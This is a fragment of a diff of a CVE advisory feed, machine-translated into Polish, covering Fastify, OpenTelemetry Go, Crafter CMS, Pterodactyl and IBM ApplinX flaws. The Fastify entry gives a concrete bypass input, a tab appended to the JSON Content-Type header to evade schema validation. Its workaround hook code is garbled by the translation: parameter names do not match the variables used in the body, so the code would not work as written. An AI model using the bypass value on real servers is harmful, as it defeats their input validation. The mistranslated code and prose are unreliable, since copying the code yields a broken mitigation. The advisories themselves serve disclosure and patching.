+Problem został rozwiązany w Fastify 5.7.3.Użytkownicy powinni dokonać aktualizacji do wersji 5.7.3 lub nowszej.
+
+### Obejścia
+Unikaj wysyłania strumieni internetowych z odpowiedzi Fastify (np. treści „ReadableStream” lub „Response”).Zamiast tego używaj strumieni Node.js („stream.Readable”) lub buforowanych ładunków, dopóki projekt nie będzie mógł zostać zaktualizowany.
+
+### Referencje
+- https://hackerone.com/reports/3524779</description></item><item><title>CVE-2026-25223</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25223</link><pubDate>Mon, 02 Feb 2026 22:23:29 +0000</pubDate><description>### Wpływ
+
+W Fastify istnieje luka w zabezpieczeniach umożliwiająca obejście walidacji, dzięki której można całkowicie obejść schematy sprawdzania treści żądania określone przez Content-Type.Dodając znak tabulacji („\t”), po którym następuje dowolna treść, do nagłówka Content-Type, atakujący mogą ominąć weryfikację treści, podczas gdy serwer nadal przetwarza treść jako oryginalny typ zawartości.
+
+Na przykład żądanie zawierające „Typ zawartości: aplikacja/json\ta” pominie weryfikację schematu JSON, ale nadal będzie analizowane jako JSON.
+
+Ta luka dotyczy wszystkich użytkowników Fastify, którzy polegają na schematach sprawdzania treści opartych na typie treści w celu egzekwowania integralności danych lub ograniczeń bezpieczeństwa.Konkretny wpływ zależy od implementacji procedury obsługi i poziomu zaufania pokładanego w zweryfikowanej treści żądania, ale na poziomie biblioteki umożliwia to całkowite ominięcie sprawdzania treści w przypadku dowolnej procedury obsługi korzystającej ze schematów rozróżniających typ zawartości.
+
+Ten problem wynika z regresji lub pominiętego przypadku Edge wynikającego z poprawki wcześniej zgłoszonej luki.
+
+### Poprawki
+
+Luka ta została załatana w **Fastify v5.7.2**.Wszyscy użytkownicy powinni natychmiast dokonać aktualizacji do tej wersji lub nowszej.
+
+### Obejścia
+
+Jeśli aktualizacja nie jest możliwa od razu, użytkownik może zaimplementować niestandardowy hak `onRequest`, aby odrzucać żądania zawierające znaki tabulacji w nagłówku Content-Type:
+
+```javascript
+fastify.addHook('onRequest', async (żądanie, odpowiedź) =&gt; {
+const contentType = request.headers ['content-type']
+if (contentType &amp;&amp; contentType.includes('\t')) {
+respond.code(400).send({błąd: 'Nieprawidłowy nagłówek typu zawartości' })
+}
+})
+```
+
+### Zasoby
+
+- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272
+- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125
+- [Dokumentacja Fastify Validation i Serialization](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/)
+- https://hackerone.com/reports/3464114</description></item><item><title>CVE-2026-24051</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24051</link><pubDate>Mon, 02 Feb 2026 20:07:46 +0000</pubDate><description>### Wpływ
 Zestaw SDK OpenTelemetry Go w wersjach `v1.20.0`-`1.39.0` jest podatny na przejęcie kontroli nad ścieżką (niezaufane ścieżki wyszukiwania) w systemach macOS/Darwin.Kod wykrywania zasobów w `sdk/resource/host_id.go` wykonuje polecenie systemowe `ioreg` przy użyciu ścieżki wyszukiwania.Osoba atakująca posiadająca możliwość lokalnej modyfikacji zmiennej środowiskowej PATH może wykonać arbitralny kod (ACE) w kontekście aplikacji.
 
 ### Poprawki
@@ -66,7 +668,7 @@ Preferowane CVE i kredyty.
 
 Jeśli użytkownicy mają jakiekolwiek pytania dotyczące szczegółów luki w zabezpieczeniach, prosimy o kontakt w celu dalszej dyskusji.Wyślij e-mail na adres [xlabai@tencent.com] (mailto:xlabai@tencent.com).
 
-Przestrzegamy branżowego standardu bezpieczeństwa [polityka ujawniania informacji 90+30](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html).Jeżeli po 90 dniach od zgłoszenia powyższe luki pozostaną nienaprawione, wszystkie informacje o problemach zostaną upublicznione.</description></item><item><title>CVE-2026-23476</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23476</link><pubDate>Mon, 02 Feb 2026 18:00:43 +0000</pubDate><description># Reflected XSS via SQL Error Messages
+Przestrzegamy branżowego standardu bezpieczeństwa [polityka ujawniania informacji 90+30](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html).Jeżeli po 90 dniach od zgłoszenia powyższe luki pozostaną nienaprawione, wszystkie informacje o problemach zostaną upublicznione.</description></item><item><title>CVE-2026-1770</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1770</link><pubDate>Mon, 02 Feb 2026 18:31:33 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa kontrola dynamicznie zarządzanych zasobów kodu w Crafter Studio programu Crafter CMS umożliwia uwierzytelnionym programistom wykonywanie poleceń systemu operacyjnego za pośrednictwem Groovy Sandbox Bypass.Wstawiając złośliwe elementy Groovy, osoba atakująca może ominąć ograniczenia piaskownicy i uzyskać RCE (zdalne wykonanie kodu).</description></item><item><title>CVE-2026-23476</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23476</link><pubDate>Mon, 02 Feb 2026 18:00:43 +0000</pubDate><description># Reflected XSS via SQL Error Messages
 
 ## Summary
 
@@ -4830,7 +5432,15 @@ CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-33228</title><l
 
 CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-33233</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-33233</link><pubDate>Tue, 20 Jan 2026 17:43:38 +0000</pubDate><description>NVIDIA Merlin Transformers4Rec dla wszystkich platform zawiera lukę, w wyniku której osoba atakująca może spowodować wstrzyknięcie kodu.Pomyślne wykorzystanie tej luki może doprowadzić do wykonania kodu, eskalacji uprawnień, ujawnienia informacji i manipulowania danymi.
 
-CVSS Score: 7.8 (high)</description></item><item><title>CVE-2025-36419</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-36419</link><pubDate>Tue, 20 Jan 2026 15:53:37 +0000</pubDate><description>IBM ApplinX 11.1 może ujawnić poufne informacje na temat architektury serwera, które mogą pomóc w dalszych atakach na system.
+CVSS Score: 7.8 (high)</description></item><item><title>CVE-2025-69198</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69198</link><pubDate>Tue, 20 Jan 2026 16:30:17 +0000</pubDate><description>### Podsumowanie
+Pterodaktyl implementuje limity szybkości, które są stosowane do całkowitej liczby zasobów (np. baz danych, przydziałów portów lub kopii zapasowych), które mogą istnieć dla pojedynczego serwera.Te limity zasobów są stosowane dla każdego serwera i sprawdzane podczas cyklu żądań.
+
+Może się jednak zdarzyć, że złośliwy użytkownik wyśle ​​jednocześnie ogromną liczbę żądań, co spowoduje utworzenie większej ilości zasobów, niż jest przydzielone serwerowi.Dzieje się tak, ponieważ weryfikacja odbywa się na początku cyklu żądania i nie blokuje zasobu docelowego podczas jego przetwarzania.W rezultacie wysłanie dużej liczby żądań w tym samym czasie doprowadziłoby do sprawdzenia, czy wszystkie te żądania nie korzystają z żadnego z zasobów docelowych, a następnie do jednoczesnego utworzenia wszystkich zasobów.
+
+W rezultacie serwer będzie mógł utworzyć więcej baz danych, przydziałów lub kopii zapasowych, niż zostało to skonfigurowane.
+
+### Wpływ
+Złośliwy użytkownik może odmówić zasobów innym użytkownikom systemu i może nadmiernie wykorzystać ograniczone przydziały dla węzła lub zapełnić miejsce na kopię zapasową szybciej, niż pozwala na to system.</description></item><item><title>CVE-2025-36419</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-36419</link><pubDate>Tue, 20 Jan 2026 15:53:37 +0000</pubDate><description>IBM ApplinX 11.1 może ujawnić poufne informacje na temat architektury serwera, które mogą pomóc w dalszych atakach na system.
 
 CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2025-36418</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-36418</link><pubDate>Tue, 20 Jan 2026 15:50:40 +0000</pubDate><description>IBM ApplinX 11.1 jest podatny na ataki ze względu na lukę umożliwiającą eskalację uprawnień w wyniku nieprawidłowej weryfikacji tokenów JWT.Osoba atakująca może być w stanie stworzyć lub zmodyfikować token sieciowy JSON w celu podszywania się pod innego użytkownika lub podniesienia jego uprawnień.
 
